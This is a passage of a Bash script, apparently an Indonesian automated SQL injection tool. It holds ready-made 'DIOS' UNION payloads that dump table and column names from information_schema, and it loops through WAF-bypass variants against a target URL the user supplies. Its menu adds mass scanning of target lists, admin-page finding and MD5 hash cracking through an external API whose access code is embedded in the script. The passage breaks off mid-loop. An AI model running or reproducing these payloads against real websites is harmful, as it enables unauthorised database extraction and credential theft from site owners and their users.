         dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
         dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
      fi
         dios6="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=database())and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
      if [[ "$waff" = "on" ]];then
      if [[ "$by"  = "$w3" ]];then
         dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
      else
         dios8="(select(@x)${by}/*!50000from*/${by}(${by}/*!50000select*/${by}(@x:=0x00),(select(0)${by}/*!From*/${by}(${by}/*!50000information_schema.columns*/${by})${by}/*!50000where*/${by}(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/${by}(@x,0x3c6c693e,/*!50000table_name${by}*/,0x3a3a,/*!50000column_name${by}*/))))x)"
         dios9="(select(@x)${by}from${by}(${by}select${by}(@x:=0x00),(select(0)${by}From${by}(${by}information_schema.columns${by})${by}where${by}(table_schema=$hex)and(0x00)in(@x:=coNcat${by}/**8**/(@x,0x3c6c693e,${by}table_name${by},0x3a3a,${by}column_name${by}))))x)"
      fi
    fi
      for dio in $dios1 $dios2 $dios3 $dios4 $dios5 $dios6 $dios8 $dios9 u
        do
          if [[ "$dio" = "u" ]]
          then
            echo -e "$N[${R}\033[7;31mCRITICAL${N}]$O F A I L E D try dump dios manual$N"
            break
          fi
          dor="@x"
          if [[ "$based64" = "y" ]]
          then
             st=$(echo "`cut -d "=" -f1 <<< $site`=" )
             if [[ "$corona" = "y" ]];then
                base44=$(sed "s#${in}#$dor#g" <<< $i2 | sed "s/,,/,/g")
             else
                if [[ "$in" = "$i" ]];then
                   base44=$(sed "s#,${in}#,$dor#g" <<< $i2 | sed "s/,,/,/g")
                else
                   base44=$(sed "s#,${in},#,$dor,#g" <<< $i2 | sed "s/,,/,/g")
                fi
             fi
             bs90=$(echo "null%20and%20mod(9,9)%20div@x:=$dio%20$union$base44" | tr -d "\n")
             bs570=$(echo "$bs90" | sed "s,+,%20,g" | base64 -i)
             base990=$(echo "$st$bs570" | tr -d "\n")
             echo -e "${O}Dios: ${N}\033[2m$base990"
             if [[ "$debug" = "y" ]];then
                echo -e "kontol $st$bs570\n$bs570\n$base44\n$bs990\n$st" #test
             fi
             if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base990" | grep -a -Po "(?<=<li>)[\.\:\_\@\[:alnum:]*::\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\.\:\_\[:alnum:]*]*<|<li>[^:]*::[_/-/./[:alnum:]]*<li>|<li>[^:]*::[_/-/./[:alnum:]]*<|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//' > .table
             then
                if cat .table | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
                   echo -e "${O}\033[2mWAFF Blocked: ${R}`cat .table 2>/dev/null | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
                   continue
                fi
                ff=$(cat .table)
                if [[ "$ff" = "" ]]
                  then
                    echo -e "${R}${N}[${R}INFO${N}] ${R}FAILED mencoba dengan dios lain${N}"
                else
                    dump
                    break
                fi
             else
                echo -e "$N[${R}\033[7;31mCRITICAL${N}]$O F A I L E D try dump dios manual$N"
             fi
         else
             if [[ "$corona" = "y" ]];then
                dk=$(sed "s#${in}#$dor#g" <<< $i2 | sed "s/,,/,/g")
             else
                if [[ "$in" = "$i" ]];then
                   dk=$(sed "s#,${in}#,$dor#g" <<< $i2 | sed "s/,,/,/g")
               else
                   dk=$(sed "s#,${in},#,$dor,#g" <<< $i2 | sed "s/,,/,/g")
             fi;fi
             if [[ "$html" = "y" ]]
             then
                if [[ "$stringna" = "y" ]]
                then
                   ls=$(echo -e "$param1%27+and+mod(9,9)+div@x:=$dio$union$dk$param2")
                else
                   ls=$(echo -e "$param1+and+mod(9,9)+div@x:=$dio$union$dk$param2")
                fi
                echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
             else
                if [[ "$postd" = "y" ]]
                then
                   ls=$(echo -e "and+mod(9,9)+div@x:=$dio$union$dk")
                   echo -e "DIOS : $postnya=null$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                else
                   ls=$(echo -e "$site+and+mod(9,9)+div@x:=$dio$union$dk")
                   echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                fi
             fi
             if [[ "$debug" = "y" ]];then
                echo -e "DIOS : $in $i2 $dk $por \n$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' #test
             fi
             echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
         fi
         if [[ "$postd" = "y" ]]
         then
           ngeles=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$ls" | tr -d '\0' | sed 's/\r$//')
         else
           ngeles=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ls" | tr -d '\0' | sed 's/\r$//')
         fi
         echo -e "${O}Dios: $N\033[2m$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
         if echo "$ngeles" | grep -a -Po "(?<=<li>)[\.\:\_\@\[:alnum:]*::\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\.\:\_\[:alnum:]*]*<|<li>[^:]*::[_/-/./[:alnum:]]*<li>|<li>[^:]*::[_/-/./[:alnum:]]*<|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//' > .table
         then
            if cat .table | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
               echo -e "${O}\033[2mWAFF Blocked: ${R}`cat .table 2>/dev/null | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
               continue
            fi
            ff=$(cat .table)
            if [[ "$ff" = "" ]]
            then
              echo -e "${R}\033[2mFAILED mencoba dengan dios lain${N}"
            else
              dump
              break
            fi
         fi
       done
#====Dump dios biasa==========================================================================================
    else
      dios6="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=database())and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
      if [[ "$waf" = "on" ]];then
      if [[ "$by"  = "$w3" ]];then
         dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
      else
         dios8="(select(@x)${by}/*!50000from*/${by}(${by}/*!50000select*/${by}(@x:=0x00),(select(0)${by}/*!From*/${by}(${by}/*!50000information_schema.columns*/${by})${by}/*!50000where*/${by}(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/${by}(@x,0x3c6c693e,/*!50000table_name${by}*/,0x3a3a,/*!50000column_name${by}*/))))x)"
         dios9="(select(@x)${by}from${by}(${by}select${by}(@x:=0x00),(select(0)${by}From${by}(${by}information_schema.columns${by})${by}where${by}(table_schema=$hex)and(0x00)in(@x:=coNcat${by}/**8**/(@x,0x3c6c693e,${by}table_name${by},0x3a3a,${by}column_name${by}))))x)"
      fi
     fi
     if [[ "$local" = "y" ]];then
        asw1="y"
     fi
        for dor in $asw1 $dios1 $dios2 $dios3 $dios4 $dios5 $dios6 $dios8 $dios9 y
        do
          if [[ "$dor" = "y" ]]
          then
            lcvs="y"
            echo -e "${O}\033[2mLocal variabel dios method${N}"
            dios
            break
          fi
          if [[ "$based64" = "y" ]]
          then
             st=$(echo "`cut -d "=" -f1 <<< $site`=" )
            if [[ "$corona" = "y" ]];then
                base44=$(sed "s#${in}#$dor#g" <<< $i2 | sed "s/,,/,/g")
             else
                if [[ "$in" = "$i" ]];then
                   base44=$(sed "s#,${in}#,$dor#g" <<< $i2 | sed "s/,,/,/g")
                else
                   base44=$(sed "s#,${in},#,$dor,#g" <<< $i2 | sed "s/,,/,/g")
                fi
             fi
             bs9=$(echo "null$union$base44" | tr -d "\n")
             bs57=$(echo "$bs9" | sed "s,+,%20,g" | base64 -i)
             base99=$(echo "$st$bs57" | tr -d "\n")
             echo -e "${O}Dios: ${N}\033[2m$base99"
             if [[ "$debug" = "y" ]];then
                echo -e "\n$bs57\n$base44\n$bs9\n$st" #test
             fi
             if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base99" | grep -a -Po "(?<=<li>)[\.\:\_\@\[:alnum:]*::\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\.\:\_\[:alnum:]*]*<|<li>[^:]*::[_/-/./[:alnum:]]*<li>|<li>[^:]*::[_/-/./[:alnum:]]*<|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//' > .table
               then
                if cat .table | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
                   echo -e "${O}\033[2mWAFF Blocked: ${R}`cat .table 2>/dev/null | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
                   continue
                fi
                ff=$(cat .table)
                if [[ "$ff" = "" ]]
                then
                  echo -e "${R}\033[2mFAILED mencoba dengan dios lain${N}"
                else
                  dump
                  break
              fi
          else
              echo -e "$N[${R}\033[7;31mCRITICAL${N}]$O F A I L E D try dump dios manual$N"
          fi
    else
       if [[ "$corona" = "y" ]];then
          dk=$(sed "s#${in}#$dor#g" <<< $i2 | sed "s/,,/,/g")
       else
          if [[ "$in" = "$i" ]];then
             dk=$(sed "s#,${in}#,$dor#g" <<< $i2 | sed "s/,,/,/g")
          else
             dk=$(sed "s#,${in},#,$dor,#g" <<< $i2 | sed "s/,,/,/g")
       fi;fi
       if [[ "$html" = "y" ]]
       then
          ls=$(echo -e "$param1$union$dk$param2")
          echo -e "${O}Dios: ${N}\033[2m$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
          else
            if [[ "$postd" = "y" ]]
            then
              ls=$(echo -e "$union$dk")
              ls1=$(echo -e "$postnya=null$ls")
              echo -e "${O}Dios: ${N}\033[2m$ls1" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
            else
              ls=$(echo -e "$site$union$dk")
              echo -e "${O}Dios: ${N}\033[2m$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
            fi
       fi
       if [[ "$debug" = "y" ]];then
          echo -e "DIOS : $in $i2 $dk $por \n$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' #test
       fi
       echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
       if [[ "$postd" = "y" ]]
       then
          ngeles=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$ls" | tr -d '\0' | sed 's/\r$//')
       else
          ngeles=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ls" | tr -d '\0' | sed 's/\r$//')
       fi
       if echo "$ngeles" | grep -a -Po "(?<=<li>)[\.\:\_\@\[:alnum:]*::\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\.\:\_\[:alnum:]*]*<|<li>[^:]*::[_/-/./[:alnum:]]*<li>|<li>[^:]*::[_/-/./[:alnum:]]*<|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//' > .table
       then
         if cat .table | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
            echo -e "${O}\033[2mWAFF Blocked: ${R}`cat .table 2>/dev/null | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
            continue
         fi
         ff=$(cat .table)
         if [[ "$ff" = "" ]]
         then
            echo -e "${R}${N}[${R}INFO${N}] ${R}FAILED mencoba dengan dios lain${N}"
         else
            dump
            break
         fi
       fi
  fi;done;fi;fi
}







inject() {
echo -n -e "\x1b[0m${N}[${BL}`date +%T`${N}] memulai menghitung order by ~"
trap break 4 INT
for i in $(seq $order_start $order_by)
  do
    printf "\r\x1b[0m${N}[${BL}`date +%T`${N}] memulai menghitung order by ${i}" $((secs--))
    colom=$(echo -e "0x6b65646a6177336e3"$(seq -s ",0x6b65646a6177336e3" 1 ${i}))
    #colom=$(seq -s ",0x6b65646a6177336e3" ${i})
    if [[ "$based64" = "y" ]]
    then
      st=$(echo "`cut -d "=" -f1 <<< $site`=" )
      bs4=$(echo "null$union$colom-- -" | tr -d "+" | base64 -i)
      base64=$(echo "$st$bs4" | tr -d "\n")
      ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$base64" | tr -d '\0' | sed 's/\r$//' | sed 's/\r$//')
      if [[ "$debug" = "y" ]];then
         echo -e "$i\n$base64"
      fi
    else
      if echo "$site" | awk -F "/" '{print $(NF)}' | cut -d "." -f2 | grep -Po "html" >/dev/null
        then
          html="y"
          m1=$(echo $site | awk -F "/" '{print $(NF)}' | grep -o "[0-9]*" | head -1)
           if [[ "$m1" = "" ]]
            then
              m2=$(echo $site | awk -F "/" '{print $(NF)}' | grep -Po ".html" | tail -1)
              param=$(echo "$site" | sed "s/$m2/'$m2/g") #delimiter koma
              param1=$(echo "$param" | cut -d "'" -f1)
              param2=$(echo "$param" | cut -d "'" -f2)
            else
              param=$(echo "$site" | sed "s/$m1/$m1'/g") #delimiter koma
              param1=$(echo "$param" | cut -d "'" -f1)
              param2=$(echo "$param" | cut -d "'" -f2)
            fi
           ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s  "$param1$union$colom--+$param2" -L | tr -d '\0' | sed 's/\r$//')
         else
           if [[ "$postd" = "y" ]]; then
              ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sX POST  "$site" -L --data "$postnya=null$union$colom--+" | tr -d '\0' | sed 's/\r$//')
           else
              ngecur=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s  "$site$union$colom--+" -L | tr -d '\0' | sed 's/\r$//')
           fi
        fi
   fi
   if [[ "$debug" = "y" ]];then #test
      if [[ "$html" = "y" ]];then
        echo "$param1$union$colom--+$param2" #test
        echo -e "$param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g' #test
      else
        echo "$ngecur" > sample
        echo -e "$ngecur\n Query: $site$union$colom--+"
      fi
   fi
   if [ $? -eq 0 ]
    then
    if echo -e "$ngecur" | grep -Po 'Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' >/dev/null
      then
       waff="on"
       for by in $w1 $w2 $w3 $w4 $w5 $w6 $w7 $w8 $w9 $w10 $union1 $bof $basic_1 $whitespaces $urlencode $double_url $bof2 `cat union.txt 2>/dev/null`
       do
           if [[ "${by}" = "$w3" ]];then
              union=$(echo -e "/**8**/and/**8**/mod(9,9)/**8**/+${by}UnIoN$w3a/**8**/${by}select$w3a/**8**/")
           else
              union=$(echo -e "${by}and${by}mod(9,9)${by}+${by}UnIoN${by}select${by}")
           fi
         if echo "$by" | grep -aP "UN|un|se|le|ct|io|UniON|UNION|union|uN|SElect|select|SELECT|seleCT" >/dev/null;then
            union="${by}"
            by="$w3"
         fi
         echo -e "\n\x1b[0m${N}[${R}`date +%T`${N}] ${N}\033[2mWAF Bypassing${N}\n\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}]${O}\033[2m mencoba bypass dengan $union"
         cek=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site%27${union}1,2,3--+" | tr -d '\0' | sed 's/\r$//')
          if [ $? -eq 0 ]
          then
            if echo -e "$cek" | grep -Po 'You are unable to access|Not Acceptable|blocked|connection was reset|Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' > .waf
            then
               echo -e "\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}] ${R}Blocked $union\n\x1b[0m${N}[${N}\033[2;35m`date +%T`${N}]${O}\033[2m WAF Type `cat .waf | head -1`${N}"
            else
               echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${G}\033[2mWAF Bypased lanjut inject lagi${N}"
               union="$union"
               echo ".rdy" > .rdy
               break
            fi
          else
             echo -e "\x1b[0m${N}[${O}`date +%T`${N}] ${R}WAF BLOCKED: $uni\nWAF TYPE: Connection Reset$N" >&2
          fi
       done
       if cat .rdy >/dev/null
       then
          sqli
      else
          echo -e "\x1b[0m${N}[${R}`date +%T`${N}] ${R}Gagal ${O}coba bypass waff manual"
      fi
      break
    fi
    if echo "$ngecur" | grep -Po "kedjaw3n3|kedjaw3n[0-9]*" > .angka
      then
      if echo "$colom" | grep -Po "," >/dev/null
         then
          corona="n"
        else
          corona="y"
       fi
       angka=$(cat .angka | cut -d "." -f2 | tr "\n" "," )
       mkdir -p output/$dir
       echo -e -n "\a\n\x1b[0m${N}[${G}\033[2m`date +%T`${N}] order by yg di dapat ${i} colom"
       echo -e -n "\n$N[${G}INFO${N}]${G} Site $dir injected $O\n"
       info
       echo -e "$info" | sed "s/amp;//g"
       if [[ "$based64" = "y" ]]
         then
          echo -e "Query: $base64" >> output/$dir/log_query.txt
          echo -e "Query: ${N}\033[2m$base64"
          echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'
       else
          if [[ "$html" = "y" ]]
          then
             echo -e "\nQuery $param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
             echo -e "$param1$union$colom--+$param2" >> .case1
             echo -e "Query: $param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
             echo -e "Query: ${N}\033[2m$param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g'
             echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'
          else
             if [[ "$postd" = "y" ]]
             then
                 echo -e "\nQuery $postnya=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                 echo -e "Query: $postnya=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
                 echo -e "Query: ${N}\033[2m$postnya=null$union$colom--+" | sed 's/0x6b65646a6177336e3//g'
                 echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'
             else
                 echo -e "$site$union$colom--+" >> .case1
                 echo -e "\nQuery $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                 echo -e "Query: $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> $injected_site
                 echo -e "Query:${O}${N}\033[2m $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g'
                 echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'
             fi
          fi
        fi
       echo -e "$angka" |  sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .angka
       if echo $mass | grep -Po "y" >/dev/null
       then
          break
       else
       dump_name="y"
       info
     fi
       break
      else
       echo $i > .tmp
     fi
     else
       echo -e "\n${R}$N[${R}\033[7;31mCRITICAL${N}]$O connection error: periksa kembali URL atau server down$N" >&2
       break
  fi
done;trap - INT;endspin
}




mulai() {
	 angkab=$(awk 'BEGIN {
	 # seed
	  srand()
    for (i=1;i<=1000;i++){
    	 print int(1 + rand() * 5)
    	 }
    }' | head -1)
    angkam=$(awk 'BEGIN {
	 # seed
	  srand()
    for (i=1;i<=1000;i++){
    	 print int(1 + rand() * 2)
    	 }
    }' | head -1)
    clear
logo
   tanya
	 #pengguna=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
   configurasi
   echo -e "${R}Thx your support :)"
   sleep 2
   menu
}



#banner logoo
logo()
{
printf "\033[31;1m"
echo "              ╔═╗  ╔═╗   ╦    ╦    "
echo "              ╚═╗  ║═╬╗  ║    ║    "
echo "              ╚═╝  ╚═╝╚  ╩═╝  ╩    "
echo "        ╦ ╔╗╔  ╦ ╔═╗ ╔═╗ ╔╦╗ ╦ ╔═╗ ╔╗╔"
echo "        ║ ║║║  ║ ║╣  ║    ║  ║ ║ ║ ║║║"
echo "        ╩ ╝╚╝ ╚╝ ╚═╝ ╚═╝  ╩  ╩ ╚═╝ ╝╚╝"
printf "\033[1;31m╔════════════════════════════════════════════╗\n"
printf "\033[1;31m║\033[1;32m* \033[1;31mAuthor  \033[1;93m: \033[1;37mK1M4K-ID             \033[1;31m           ║\n"
printf "\033[1;31m║\033[1;32m* \033[1;31mGithub  \033[1;93m: \033[1;37m\033[4mhttps://github.com/K1M4K-ID\033[0m \033[1;31m    ║\n"
printf "\033[1;31m║\033[1;32m* \033[1;31mBlogs   \033[1;93m: \033[1;37m\033[4mcybersecurity-kimak.blogspot.com\033[0m\033[1;31m║\n"
printf "\033[1;31m╚════════════════════════════════════════════╝\n\n"

}




menu() {
	angkab=$(awk 'BEGIN {
	 # seed
	  srand()
    for (i=1;i<=1000;i++){
    	 print int(1 + rand() * 5)
    	 }
    }' | head -1)
    angkam=$(awk 'BEGIN {
	 # seed
	  srand()
    for (i=1;i<=1000;i++){
    	 print int(1 + rand() * 2)
    	 }
    }' | head -1)
    clear
logo
if [[ "$debug" = "s" ]];then
  echo "developer mode string based"
  union="%27$union"
fi
if [[ "$debug" = "y" ]];then
   echo -e "${N}[${R}@${N}]. DEBUG MODE: ${R}ON${N}"
fi
printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m start site injection \033[31;1m{sqli}\n"
sleep 0
printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m hash password\n"
sleep 0
printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m admin finder\n"
sleep 0
printf "\033[31;1m[\033[32;1m4\033[31;1m]\033[37;1m sqli,Xss,LFI AdminFinder Scanner\n\n"
sleep 0
read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m choice : "'\033[34;1m')" input
echo
}

start(){
  menu
  if [ $input = "1" ] || [ $input = "01" ];
  then
    mass="n"
       dump_name="n"
       waff="n"
       clear
       logo
       read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m target url : "'\033[34;1m')" site
       echo -en "\n"
               if echo "$site" | grep -Po "&" >/dev/null
                    then
                       echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${G}\033[2mdouble parameter found"
                       rm -rf .var .var2
                       asq=$(echo $site | grep -ao ".[^&]*" | head -1)
                       eq=$(echo $site | grep -ao ".[^&]*" | wc -l)
                       echo "$asq" >> .var
                       for iq in `seq 2 $eq`
                       do
                         var1=$(cut -d "&" -f$iq <<< $site)
                         echo -e "${N}\x1b[0m${N}[${O}\033[2m`date +%T`${N}] ${O}\033[2minjecting parameter $var1${N}"
                         echo -ne "$var1&" >> .var2
                         echo "$asq&`cat .var2`" | sed s/'&$'// >> .var
                       done
                       trap break INT
                       for site in `cat .var`
                       do
                          sqli
                       done
                       trap - INT
                    else
                       sqli
                    fi
       menu
  elif [ $input = "2" ] || [ $input = "02" ];
  then
         clear
         logo
         printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m hash indentifier \033[31;1m{scan}\n"
         sleep 0
         printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m md5 dencryptor\n"
         sleep 0
         printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m md5 email pass dencryptor\n"
         sleep 0
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m choice : "'\033[34;1m')" p
         echo
         if [ $p = "1" ] || [ $p = "01" ];
         then
            clear
            logo
            hashid
            menu
         elif [ $p = "2" ] || [ $p = "02" ];
         then
            clear
            logo
            printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m hash md5 biasa \n"
            sleep 0
            printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m hash md5 all\n"
            sleep 0
            read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m choice : "'\033[34;1m')" x
            echo
              if [ $x = "1" ] || [ $x = "01" ];
              then
                  clear
                  logo
                  read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m Hash : "'\033[34;1m')" hash
                  dec=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728")
                  if [[ "$dec" = "" ]]
                  then
                    echo -e "${R}F A I L E D${N}"
                  else
                    echo "Result: $dec"
                  fi
                  read -p "Press Enter for continue " aswkxkkxk
                  menu

               elif [ $x = "2" ] || [ $x = "02" ];
               then
                  clear
                  logo
                  read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m Masukan list md5 : ")" file
                  for hash in `cat $file`
                  do
                  dec=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728")
                  if [ "$dec" = "" ];then
                     echo "[?] Not Cracked: ${hash} "
                  else [ "$dec" = "[[:punct:][:alnum:]]*" ]
                      echo "$dec" >> cracked-$list.txt
                      echo "[!] Cracked: ${hash} $del $dec"
                  fi
                  done
                  read -p "Press Enter for continue " aswkxkkxk
                  menu

              else
                echo "masukan input dengan benar :("
                sleep 3
                menu
              fi
            else
              echo "masukan input dengan benar :("
              sleep 3
              menu
          fi
elif [ $input = "3" ] || [ $input = "03" ];
then
  printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m hash md5 biasa \n"
  sleep 0
  printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m hash md5 all\n"
  sleep 0
  read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m choice : "'\033[34;1m')" x
  echo
    if [ $x = "1" ] || [ $x = "01" ];
    then
      read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m target url : "'\033[34;1m')" site
      adminfin
      menu

     elif [ $x = "2" ] || [ $x = "02" ];
     then
       clear
       logo
       read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m target list : "'\033[34;1m')" list
       for site in `cat $list 2>/dev/null | sed 's/\r$//' | tr -d "\0"`
       do
          adminfin
